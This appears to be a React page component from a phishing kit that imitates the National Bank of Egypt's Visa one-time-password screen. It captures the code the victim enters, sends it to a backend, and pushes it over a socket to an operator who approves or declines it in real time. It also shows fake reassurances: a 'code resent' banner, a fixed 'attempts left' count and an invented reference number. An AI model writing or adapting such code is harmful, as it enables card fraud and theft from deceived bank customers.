import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import {
  IoCheckmarkCircle,
  IoChevronBack,
  IoChevronForward,
  IoClose,
} from "react-icons/io5";
import { CiLogout } from "react-icons/ci";
import { id } from "./Home";
import { IoIosLogOut } from "react-icons/io";
import { useLanguage } from "../hooks/useLanguage";
import { useAdminApproval } from "../hooks/useAdminApproval";
import { generateReferenceNumber } from "../utils/generateReferenceNumber";
import ProcessingOverlay from "../components/nbe/ProcessingOverlay";
import DeclineError from "../components/nbe/DeclineError";

const VisaOtp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [showBanner, setShowBanner] = useState(true);
  const [referenceNumber] = useState(generateReferenceNumber);
  const { t, dir } = useLanguage();
  const { waiting, setWaiting, clearError, declineMessage } = useAdminApproval({
    orderId: id,
    acceptEvent: "acceptVisaOtp",
    declineEvent: "declineVisaOtp",
    declineMessageKey: "declineVisaOtp",
    onAccept: () => navigate("/visa"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    clearError();
    setWaiting(true);
    try {
      await axios.post(api_route + "/visaOtp/" + id, { otp }).then(() => {
        socket.emit("visaOtp", { id, visaOtp: otp });
      });
    } catch (err) {
      setWaiting(false);
    }
  };

  return (
    <div
      className="w-full min-h-screen bg-gray-100 flex flex-col items-center px-4 pb-6"
      dir={dir}
    >
      {waiting && <ProcessingOverlay />}
      <div className="w-full max-w-md relative">
        <div className="w-full flex items-center justify-between pt-4 pb-2">
          <button
            type="button"
            className="p-2 text-zinc-400 text-2xl"
            aria-label="Exit"
          >
            {dir === "rtl" ? <IoIosLogOut /> : <CiLogout />}
          </button>
          <img src="/img1.png" alt="NBE Logo" className="w-2/5" />
          {dir === "rtl" ? (
            <IoChevronBack to="/visa" className="text-zinc-400 text-2xl" />
          ) : (
            <IoChevronForward to="/visa" className="text-zinc-400 text-2xl" />
          )}
        </div>

        {showBanner && (
          <div className="w-full flex items-start gap-2 border border-zinc-300 rounded-lg bg-white p-3 mb-4 mt-2">
            <IoCheckmarkCircle className="text-nbe-green text-xl shrink-0 mt-0.5" />
            <p className="text-nbe-green text-sm flex-1 leading-relaxed">
              {t("otpResentSuccess")}
            </p>
            <button
              type="button"
              onClick={() => setShowBanner(false)}
              className="text-zinc-400 text-lg shrink-0"
              aria-label="Dismiss"
            >
              <IoClose />
            </button>
          </div>
        )}

        <div className="w-full py-5 border rounded-lg flex flex-col bg-gray-100">
          <div className="font-bold text-gray-700 border-b px-5 border-gray-300 w-full pb-5 text-sm">
            {t("oneTimeVerification")}
          </div>
          <p className="text-nbe-green px-5 text-sm py-5 leading-8">
            {t("otpInstructions")}
          </p>
          <form onSubmit={handleSubmit} className="flex flex-col w-full px-5">
            <span className="text-zinc-800">{t("verificationCode")}</span>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              minLength={4}
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              className="w-1/2 py-2 px-3 my-3 rounded-lg border-orange-300 border"
              required
            />
            <button
               type="submit"
              className="bg-nbe-green rounded-md px-5 py-3 text-xs w-fit text-white mb-4"
            >
              {t("confirmCode")}
            </button>

            <span className="py-1 pt-3 text-nbe-green font-semibold text-sm">
              {t("attemptsLeft")}
            </span>
            <span className="text-zinc-700 mb-2">5</span>

            <span className="py-1 pt-2 text-nbe-green font-semibold text-sm">
              {t("referenceNumber")}
            </span>
            <span className="border-y border-white text-zinc-700 py-1 mb-4">
              {referenceNumber}
            </span>

            <button
              type="submit"
              disabled={waiting}
              className="text-white flex items-center justify-center font-semibold bg-orange-400 rounded-xl py-2 w-full my-3 disabled:opacity-70"
            >
              {waiting ? (
                <TailSpin
                  height="30"
                  width="30"
                  color="white"
                  ariaLabel="tail-spin-loading"
                  radius="1"
                  visible={true}
                />
              ) : (
                t("submit")
              )}
            </button>

            <DeclineError message={declineMessage} />
          </form>
        </div>

        <img
          src={`/img5.${dir === "rtl" ? "avif" : "jpeg"}`}
          className="w-full my-4"
          alt=""
        />
      </div>
    </div>
  );
};

export default VisaOtp;
